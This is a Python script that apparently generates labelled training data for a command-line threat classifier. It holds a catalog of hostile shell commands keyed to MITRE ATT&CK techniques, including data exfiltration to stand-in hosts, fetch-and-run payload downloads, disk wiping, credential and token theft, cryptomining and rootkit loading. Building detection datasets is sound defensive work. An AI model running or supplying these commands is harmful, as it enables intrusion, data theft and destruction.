import argparse
import json
import random
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(BASE_DIR / "parser"))

from build_residual_dataset import process_row


CATALOG = {
    "T1006": [
        r"dd if=\\.\PhysicalDrive0 of=C:\Users\Public\mbr.bin bs=512 count=1",
        "dd if=/dev/sda of=/tmp/disk-header.bin bs=4k count=16",
        "debugfs -R 'cat <8>' /dev/sda1 > /tmp/inode8.bin",
        "esentutl /y \\.\\PhysicalDrive1 /d C:\\Temp\\drive-copy.bin /o",
        "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\Temp\\ifm' q q",
    ],
    "T1010": [
        "wmctrl -lp",
        "xwininfo -root -tree",
        "powershell -c \"Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName,MainWindowTitle\"",
        "cmd /c tasklist /v | findstr /i \"chrome outlook teams\"",
        "xdotool search --name \"Microsoft Teams\" getwindowname %@",
    ],
    "T1025": [
        "cp -r /media/usb0/Finance/Q4 /srv/stage/removable-copy",
        "robocopy E:\\Projects C:\\ProgramData\\cache\\usb_stage /E /R:1 /W:1",
        "tar -czf /tmp/usb-home.tgz /run/media/alice/KINGSTON/home/alice/Documents",
        "powershell -c \"Copy-Item -Path F:\\HR\\* -Destination C:\\Users\\Public\\stage -Recurse -Force\"",
        "find /Volumes/USB_DISK/ -type f -name '*.docx' -exec cp {} /tmp/stage/ \\;",
    ],
    "T1039": [
        "mount -t cifs //10.0.0.25/eng /mnt/eng -o username=svc-backup,password='Winter2024!' && rsync -a /mnt/eng/ /var/tmp/eng_stage/",
        "net use Z: \\\\fileserver\\finance /user:CORP\\svc_sync P@ssw0rd! && xcopy Z:\\*.xlsx C:\\ProgramData\\stage /s /i /y",
        "cp -r /mnt/smb/Legal /tmp/legal_stage",
        "powershell -c \"New-PSDrive -Name S -PSProvider FileSystem -Root '\\\\nas01\\shared' -Persist; Copy-Item S:\\Designs\\* C:\\Temp\\sharegrab -Recurse\"",
        "smbclient //fs01/ops -U corp/user%Secret123 -c 'recurse on; prompt off; mget scripts/*'",
    ],
    "T1072": [
        "ansible all -i hosts.ini -m shell -a 'curl -fsSL http://10.0.0.5/bootstrap.sh | bash' -u deploy",
        "ansible-playbook -i prod.ini rollout.yml --extra-vars 'artifact=http://10.0.0.8/agent.bin'",
        "salt '*' cmd.run 'powershell -ep bypass -file C:\\Windows\\Temp\\update.ps1'",
        "chef-client -o 'recipe[corp::deploy_payload]'",
        "pdsh -R ssh -w web[01-20] 'systemctl stop falcon-sensor && bash /tmp/run.sh'",
    ],
    "T1120": [
        "lsusb -v",
        "Get-PnpDevice -Class USB,DiskDrive | Select-Object FriendlyName,InstanceId",
        "wmic path Win32_USBControllerDevice get Dependent",
        "system_profiler SPUSBDataType",
        "udevadm info --export-db | grep -i usb",
    ],
    "T1123": [
        "arecord -D hw:0,0 -f cd -d 300 /tmp/meet.wav",
        "ffmpeg -f avfoundation -i ':0' -t 120 /tmp/mic_capture.m4a",
        "sox -t waveaudio default -r 16000 -c 1 C:\\ProgramData\\audio.wav trim 0 180",
        "ffmpeg -f dshow -i audio=\"Microphone Array\" -t 90 C:\\Users\\Public\\room.wav",
        "parecord --device=alsa_input.pci-0000_00_1f.3.analog-stereo /tmp/desk-audio.ogg",
    ],
    "T1197": [
        "bitsadmin /create updater && bitsadmin /addfile updater http://10.0.0.12/payload.dll C:\\ProgramData\\updater.dll && bitsadmin /resume updater",
        "powershell -c \"Start-BitsTransfer -Source http://10.0.0.14/stager.ps1 -Destination C:\\Windows\\Temp\\stager.ps1 -Asynchronous\"",
        "bitsadmin /create syncjob && bitsadmin /addfile syncjob https://cdn.example.org/tool.exe C:\\Users\\Public\\tool.exe && bitsadmin /setnotifycmdline syncjob C:\\Windows\\System32\\cmd.exe '/c C:\\Users\\Public\\tool.exe'",
        "bitsadmin /create corpjob && bitsadmin /addfile corpjob http://192.168.10.20/a.dat C:\\ProgramData\\a.dat && bitsadmin /SetMinRetryDelay corpjob 60 && bitsadmin /resume corpjob",
        "powershell -c \"Import-Module BitsTransfer; $job=Start-BitsTransfer -Source https://10.0.0.15/a.ps1 -Destination C:\\Temp\\a.ps1 -Suspended; Resume-BitsTransfer -BitsJob $job\"",
    ],
    "T1496": [
        "xmrig -o pool.supportxmr.com:443 -u 49d.example.worker1 -k --tls --cpu-max-threads-hint=90",
        "docker run --rm --cpus=6 ubuntu:22.04 bash -lc 'apt-get update && apt-get install -y wget && wget -qO- http://10.0.0.9/xmrig.tgz | tar xz && ./xmrig -o pool:4444 -u wallet -p x'",
        "powershell -w hidden -c \"Start-Process C:\\ProgramData\\miner.exe '-a rx/0 -o pool.example:3333 -u wallet.worker -p x'\"",
        "nice -n 19 nohup ./kinsing --url http://10.0.0.7/pool --threads 8 >/tmp/.k.log 2>&1 &",
        "kubectl run cpu-burn --image=alpine --restart=Never -- /bin/sh -c 'while true; do sha1sum /dev/zero; done'",
    ],
    "T1561": [
        "shred -n 3 -z /dev/sdb",
        "dd if=/dev/zero of=/dev/sda bs=8M status=progress",
        "diskpart /s C:\\Windows\\Temp\\wipe.txt",
        "wipefs -a /dev/nvme0n1",
        "powershell -c \"Get-Disk 2 | Clear-Disk -RemoveData -Confirm:$false\"",
    ],
    "T1609": [
        "docker exec -it payments-db bash -lc 'cat /run/secrets/db_password && id && uname -a'",
        "kubectl exec -n kube-system coredns-7d6f5 -- sh -c 'env; cat /var/run/secrets/kubernetes.io/serviceaccount/token'",
        "ctr task exec --exec-id audit nginx /bin/sh -c 'ls /etc && cat /etc/passwd'",
        "crictl exec -it 3f9c2b7a1c2d /bin/bash -lc 'find / -maxdepth 2 -name kubeconfig 2>/dev/null'",
        "docker exec webapp sh -c 'tar czf - /app/config | base64 -w0'",
    ],
    "T1610": [
        "docker run -d --name updater --restart unless-stopped -v /:/host -e MODE=agent ghcr.io/acme/sys-agent:latest",
        "kubectl create deployment diag-shell --image=alpine:3.19 -- /bin/sh -c 'sleep 36000'",
        "kubectl run harvest --image=busybox --restart=Never --overrides='{\"spec\":{\"hostNetwork\":true}}' -- sh -c 'env; sleep 600'",
        "docker compose up -d edge-cache",
        "nerdctl run --privileged -v /var/run/docker.sock:/var/run/docker.sock -d alpine sh -c 'sleep infinity'",
    ],
    "T1613": [
        "docker ps --format '{{.ID}} {{.Image}} {{.Names}}' && docker inspect $(docker ps -q)",
        "kubectl get pods,svc,secrets -A -o wide",
        "crictl ps -a && crictl images && crictl pods",
        "docker info && docker volume ls && docker network ls",
        "kubectl describe nodes && kubectl get sa -A",
    ],
    "T1011": [
        "nc -l -p 4444 < /var/log/syslog | nc attacker.com 5555",
        "socat TCP-LISTEN:9999 SERIAL:/dev/ttyUSB0,b9600",
        "hcitool cmd 0x04 0x05 0x01 && rfcomm bind /dev/rfcomm0 00:11:22:33:44:55",
    ],
    "T1014": [
        "insmod /tmp/rootkit.ko",
        "modprobe backdoor.ko rootkit=1",
        "sudo insmod ./evil.ko param1=value1",
    ],
    "T1020": [
        "0 0 * * * tar czf - /home/user/docs | curl -d @- http://10.0.0.5/recv",
        "crontab -e && echo '@daily find /var/www -type f -exec curl -F file=@{} http://10.0.0.8/exfil \\;'",
        "schedule_task.ps1 -cmd 'Get-ChildItem -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} | Compress-Archive -DestinationPath C:\\Temp\\daily.zip && curl -F file=@C:\\Temp\\daily.zip http://10.0.0.7/recv'",
    ],
    "T1029": [
        "at 15:30 /every:M,W,F \"powershell -c $data=Get-Content C:\\ProgramData\\stage\\*; Send-NetMessage -To 10.0.0.5 -Data $data\"",
        "schtasks /create /tn ExfilTask /tr \"powershell -c (Get-Content C:\\Users\\Public\\log.txt | curl -d @- http://10.0.0.10/recv)\" /sc daily /st 23:00",
        "crontab -e && echo '30 2 * * * sftp -b /tmp/xfer.txt user@10.0.0.20:/incoming'",
    ],
    "T1030": [
        "find /var/www/html -type f -size +100M -exec tar -cf - {} \\; | split -b 50M - /tmp/chunk_",
        "split -b 10M /var/lib/db/large.sql /tmp/db_part_ && for part in /tmp/db_part_*; do curl -F file=@$part http://10.0.0.9/recv; done",
        "powershell -c $file = 'C:\\data\\large.iso'; $size = (Get-Item $file).Length; $chunk = 25MB; $stream = New-Object IO.FileStream $file, Open; while($stream.Position -lt $stream.Length) { [byte[]]$buffer = New-Object byte[] $chunk; $read = $stream.Read($buffer, 0, $chunk); [Net.ServicePointManager]::SecurityProtocol = 'Tls12'; Invoke-WebRequest -Uri http://10.0.0.11/chunk -Method Post -Body $buffer }",
    ],
    "T1068": [
        "exploit //10.0.0.50/exploit.bin -target linux_kernel_cve_2021_22555",
        "kernel_exploit.sh --cve CVE-2023-0386 --target /tmp/ovl",
        "./CVE-2024-1086.c && gcc -o poc poc.c && ./poc",
    ],
    "T1080": [
        "cp /tmp/payload.sh /mnt/shared_nfs/payload.sh && chmod +x /mnt/shared_nfs/payload.sh",
        "xcopy /E /I /Y C:\\ProgramData\\malware \\\\fileserver\\shared\\stage\\",
        "rsync -a --delete /tmp/backdoor /mnt/smb/Documents/sync/",
    ],
    "T1102": [
        "curl -X POST -d 'cmd=whoami&session=abc123' http://blog.example.com/api/comments",
        "powershell -c \"$req = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body @{api_dev_key='key';api_paste_code='powershell -nop -w hidden -c iex(New-Object Net.WebClient).DownloadString(''http://10.0.0.5/stager'')'}; Write-Host $req.Content\"",
        "wget -q -O- http://slack-webhook.api/send?channel=logs&text=$(id%20-u)",
    ],
    "T1125": [
        "ffmpeg -f gdigrab -i desktop -t 60 C:\\Temp\\desktop.mp4",
        "screencapture -x -t mov /tmp/screen.mov",
        "vlc --sout '#transcode{vcodec=h264}:rtp{dst=192.168.1.100:5004}' rtsp://webcam.local/stream",
    ],
    "T1176": [
        "curl -X POST -d '{\"name\":\"BadExtension\",\"permissions\":[\"tabs\",\"management\",\"webRequest\"]}' http://localhost:9222/json/new",
        "powershell -c \"Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('chrome --load-extension=/tmp/ext --disable-extensions-except=/tmp/ext')\"",
        "python -m http.server 8080 & python -c \"import ctypes; ctypes.windll.shell32.ShellExecuteW(None,'open','chrome','/store/apps/detail/123','.',1)\"",
    ],
    "T1187": [
        "responder.py -I eth0 -dwPv",
        "ntlmrelayx.py -t ldap://10.0.0.10 -l /tmp/output",
        "python -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',80)); print('Listening for NTLM...'); s.accept()\"",
    ],
    "T1195": [
        "pip install requests==2.28.1 --target /tmp/vendor",
        "npm install -g @malicious/package@latest",
        "git clone https://github.com/legitimate/repo.git && cd repo && git remote set-url origin https://attacker.com/repo.git",
    ],
    "T1207": [
        "mimikatz # lsadump::dcshadow /object:CN=User /attribute:servicePrincipalName /value:HOST/attacker.com",
        "powershell -c \"Set-DomainObject -Identity 'CN=Administrator' -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}\"",
        "ldapsearch -x -h dc.corp.com -b DC=corp,DC=com '(sAMAccountName=user)' | ldapmodify -x -D 'CN=Admin,DC=corp,DC=com' -w pass",
    ],
    "T1210": [
        "curl -X POST http://unpatched.example.com:8080/rce -d 'cmd=id' -H 'X-Forwarded-For: 127.0.0.1'",
        "python -c \"requests.post('http://10.0.0.42:9200/_nodes/process/clear_cache?pretty', json={})\"",
        "nmap -p 445 10.0.0.0/24 && crackmapexec smb 10.0.0.0/24 -u admin -p pass -x 'whoami'",
    ],
    "T1213": [
        "git clone https://internal.git/restricted.git /tmp/harvest",
        "curl -H 'Authorization: Bearer token123' https://api.example.com/v1/secrets",
        "ldapsearch -x -h ldap.corp.com -b 'CN=Organizational Data,DC=corp,DC=com' '(objectClass=*)' | grep -i password",
    ],
    "T1498": [
        "hping3 -i u1 -S --flood -p 80 10.0.0.100",
        "ab -n 100000 -c 1000 http://target.com/",
        "slowhttptest -c 1000 -H -g http://target.com -t HEAD -l 3600",
    ],
    "T1499": [
        "(){ :|(){ : | :& };: };",
        "yes > /dev/null &",
        "perl -e 'fork() while fork()' &",
    ],
    "T1525": [
        "docker build -t evil:latest -f Dockerfile.backdoor .",
        "python3 -c \"import docker; c=docker.from_env(); c.images.build(path='/tmp/build',tag='backdoored:v1')\"",
        "nerdctl build --file=Dockerfile -t registry.internal/evil:latest /tmp/docker_build/",
    ],
    "T1542": [
        "dd if=bootsector.bin of=/dev/sda bs=446 count=1",
        "grub2-mkconfig -o /boot/grub2/grub.cfg && echo 'insmod /boot/backdoor.ko' >> /boot/grub2/grub.cfg",
        "bcdedit /create /d 'Recovery' /application bootapp && bcdedit /set {guid} path \\EFI\\boot\\evil.efi",
    ],
    "T1565": [
        "sed -i 's/price: 99/price: 999/g' /var/www/products.json && systemctl restart apache2",
        "awk '{gsub(/CRITICAL/,\"RESOLVED\"); print}' /var/log/audit.log > /var/log/audit.log.new && mv /var/log/audit.log.new /var/log/audit.log",
        "python -c \"import sqlite3; conn=sqlite3.connect('/var/lib/app/data.db'); conn.execute('UPDATE users SET balance=balance+10000 WHERE id=5'); conn.commit()\"",
    ],
    "T1647": [
        "defaults write /Library/Preferences/com.apple.LaunchServices/com.apple.quarantineresolver QarantineProperties '{} (null) ALL (null)'",
        "python -c \"import plistlib; d=plistlib.load(open('/Library/Preferences/com.example.app.plist','rb')); d['DisableSecurity']=True; plistlib.dump(d,open('/Library/Preferences/com.example.app.plist','wb'))\"",
        "/usr/libexec/PlistBuddy -c 'Add :InsecureFlag bool true' /Library/Preferences/com.apple.security.plist",
    ],
    "T1653": [
        "powercfg /change standby-timeout-ac 0 && powercfg /change monitor-timeout-ac 0",
        "systemd-inhibit --why 'System Maintenance' sleep infinity &",
        "dconf write /org/gnome/settings-daemon/plugins/power/sleep-inactive-ac-timeout 0",
    ],
    "T1668": [
        "flock -x /var/lock/critical.lock -c 'sleep infinity' &",
        "lockfile /var/spool/lockfile && sleep 36000",
        "python -c \"import fcntl,time; f=open('/tmp/.lock','w'); fcntl.flock(f,fcntl.LOCK_EX); time.sleep(36000)\"",
    ],
    "T1673": [
        "systemd-detect-virt",
        "dmidecode | grep -i 'vmware\\|virtualbox\\|qemu\\|hyperv\\|parallels'",
        "lspci | grep -i 'vga\\|video' && hostnamectl",
    ],
    "T1674": [
        "xdotool type 'admin' && xdotool key Return && xdotool key ctrl+alt+Delete",
        "python3 -c \"from pynput.keyboard import Controller; k=Controller(); k.type('payload.exe'); k.press('enter')\"",
        "echo -en '\\x41\\x42\\x43' | xdotool type --file -",
    ],
    "T1675": [
        "esxcli system maintenanceMode set --enable true",
        "esxcli storage core device set --device naa.6001405... --perennially-reserved true",
        "esxcli system settings kernel set -s logPort -v 515",
    ],
    "T1678": [
        "sleep 3600 &",
        "at now + 2 hours /bin/bash < /tmp/stage.sh",
        "powershell -c \"Start-Sleep -Seconds 7200; C:\\Windows\\Temp\\payload.exe\"",
    ],
    "T1563": [
        "tmux list-sessions && tmux new-session -d -s backup -x 100 -y 30",
        "screen -list && screen -S work -X readbuf -e -p /tmp/hijack.txt",
        "tmux send-keys -t target 'cat /etc/shadow' Enter",
    ],
    "T1612": [
        "docker build -f Dockerfile.backdoor -t evil:v1 /tmp/build/",
        "buildah build-using-dockerfile -f Dockerfile.pwn -t reg.internal/backdoor:latest",
        "podman build --file Dockerfile.modified -t localhost/evil /tmp/src/",
    ],
    "T1615": [
        "gpresult /h C:\\Temp\\gp_report.html && findstr /i 'policy denied' C:\\Temp\\gp_report.html",
        "secedit /export /cfg C:\\Temp\\sec.cfg",
        "Get-GPO -All | Select-Object DisplayName,CreationTime | Out-File C:\\Temp\\gpos.txt",
    ],
}


def build_row(raw_command: str, label: str, variant: str) -> dict:
    rec = process_row(raw_command, label)
    return {
        "input_text": rec[f"input_{variant}"],
        "label": rec["label"],
        "rule_strength": rec["rule_strength"],
        "raw_command": rec["raw_command"],
        "residual": rec["residual"],
        "features": rec["features"],
        "fired_rules": rec["fired_rules"],
    }


def split_commands(commands: list[str], seed: int) -> dict[str, list[str]]:
    items = list(commands)
    random.Random(seed).shuffle(items)
    train = items[:3]
    val = items[3:4]
    test = items[4:]
    return {"train": train, "val": val, "test": test}


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate curated CLI specialist residual datasets")
    ap.add_argument("--out-dir", default=str(BASE_DIR / "data" / "training" / "genos_residual_cli"))
    ap.add_argument("--variant", choices=["a", "b", "c"], default="a")
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    out_dir = Path(args.out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    rows = {"train": [], "val": [], "test": []}

    for label, commands in sorted(CATALOG.items()):
        for split_name, split_cmds in split_commands(commands, args.seed).items():
            for raw_command in split_cmds:
                rows[split_name].append(build_row(raw_command, label, args.variant))

    for split_name, split_rows in rows.items():
        path = out_dir / f"specialist_{split_name}_variant_{args.variant}.jsonl"
        with open(path, "w", encoding="utf-8") as f:
            for row in split_rows:
                f.write(json.dumps(row, ensure_ascii=False) + "\n")

    summary = {
        split_name: {
            "rows": len(split_rows),
            "classes": len({row["label"] for row in split_rows}),
        }
        for split_name, split_rows in rows.items()
    }
    with open(out_dir / "summary.json", "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()